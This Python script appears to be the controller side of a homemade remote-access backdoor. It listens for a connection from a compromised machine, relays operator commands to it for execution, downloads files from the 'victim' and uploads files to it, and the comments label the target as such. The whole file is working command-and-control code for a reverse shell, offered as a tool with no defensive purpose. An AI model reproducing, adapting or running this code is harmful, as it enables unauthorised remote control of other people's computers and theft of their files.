import subprocess
import socket
import json
import optparse
import os
import struct

def getArguments():
    parser = optparse.OptionParser()
    parser.add_option('-i', '--ip', dest= 'serverIp', help= 'Listener ip')
    parser.add_option('-p', '--port', dest= 'serverPort', help= 'Listener port')
    options = parser.parse_args()[0]
    return options

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))    
        listener.listen(0)

        print('Listening for connection...')
        self.connection, address = listener.accept()
        print(f'[+]Connected to {address}\n')

    # Data is sent and recived in json format:
    # json encode to send
    def reliableSend(self, data):
        if isinstance(data, bytes):
            jsonData = json.dumps(data.decode(errors= 'replace'))            
        else:
            jsonData = json.dumps(data)

        self.connection.send(bytes(jsonData, 'utf-8'))

    # decode recived json data
    def reliableRecieve(self):
        jsonData = ''
        while True:
            # With a bucle, we make sure that all data is recived
            '''try:
                jsonData = self.connection.recv(4096)                
                return json.loads(jsonData.decode('utf-8'))
            
            except ValueError: 
                print('ERROR')
                continue'''
            jsonData = self.connection.recv(4096)
            return json.loads(jsonData)

    def receive_file_size(self, sck: socket.socket):
        # This function makes sure all bytes are recived which indicates the size
        # of the file will be sent, that is codified by client way struct.pack(),
        fmt = "<Q"
        expected_bytes = struct.calcsize(fmt)
        received_bytes = 0
        stream = bytes()

        while received_bytes < expected_bytes:
            chunk = sck.recv(expected_bytes - received_bytes)
            stream += chunk
            received_bytes += len(chunk)

        filesize = struct.unpack(fmt, stream)[0]
        return filesize

    def receive_file(self, sck: socket.socket, filename, route):
        # First, this reads the file size to recieve and then open a new file when
        # the recieved data will be saved
        filesize = self.receive_file_size(sck)
        filename = os.path.basename(filename)
        try:    
            with open(f'{route}{filename}', "wb") as f:
                mensaje = '[+]Success download'
                received_bytes = 0
                # Revieces file in packs of 1024 bytes to complete the total bytes
                # amount
                while received_bytes < filesize:
                    chunk = sck.recv(1024)
                    # If socket contains an 'no encononontrado' message in the 
                    # recieved packet(xd), that means than file to recieve was not
                    # found and it will print an error message
                    if chunk and not (b'no encononontrado' in chunk):                    
                        f.write(chunk)
                        received_bytes += len(chunk)
                    else:
                        mensaje = '[-]Error in download'
                        break
                print(mensaje)
        except FileNotFoundError:
            print('[-]Directorio no encontrado')

    def send_file(self, sck: socket.socket, filename):
        try:
            filesize = os.path.getsize(filename)
            # Tell to socket the size file to send
            sck.sendall(struct.pack("<Q", filesize))
            # Send the file in packs of 1024 bytes
            with open(filename, "rb") as f:
                while read_bytes := f.read(1024):
                    sck.sendall(read_bytes)
        except FileNotFoundError:
            # if device who is going to recieve the file reads this message, will 
            # print an error message
            sck.sendall(b'[-]Archivo no encononontrado')

    # Send the command to victim's side and recieve its message. If the command
    # to send is 'exit' or 'Exit', the execution finish to the both sides
    def remoteAction(self, command):
        self.reliableSend(command)
        if command[0] == 'exit' or command[0] == 'Exit':
            print('Execution finished')
            self.connection.close()
            exit()
        return self.reliableRecieve()

    def run(self):
            while True:                
                command = input('>>')
                command = command.split(' ')

                # Download a victim's file
                if command[0] == 'down':
                    self.reliableSend(command)
                    self.receive_file(self.connection, ' '.join(command[2:]), command[1])
                    result = ''
                
                # Upload a file to the victim
                elif command[0] == 'up':
                    #command[0]=command('up'), command[1]=path, command[2:]=file name
                    self.reliableSend(command)
                    self.send_file(self.connection, ' '.join(command[2:]))
                    result = self.reliableRecieve()

                # Clear shell's content (Linux)
                elif command[0] == 'clear':
                    subprocess.call('clear')
                    result = ''

                else:
                    result = self.remoteAction(command)

                print(result)

options = getArguments()
try:
    listener = Listener(options.serverIp, int(options.serverPort))
    listener.run()

except KeyboardInterrupt:
    print('\nExecution finished')
